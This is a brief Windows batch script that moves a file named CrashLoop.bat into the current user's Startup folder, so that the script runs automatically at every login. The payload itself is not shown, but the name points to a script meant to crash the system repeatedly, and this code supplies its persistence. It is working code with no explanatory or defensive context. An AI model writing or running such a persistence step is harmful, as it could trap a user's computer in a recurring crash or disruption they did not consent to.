@echo off
set "shortcutPath=CrashLoop.bat"
rem Get the current user's startup folder location
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Move the shortcut to the startup folder
move "%shortcutPath%" "%startupFolder%"
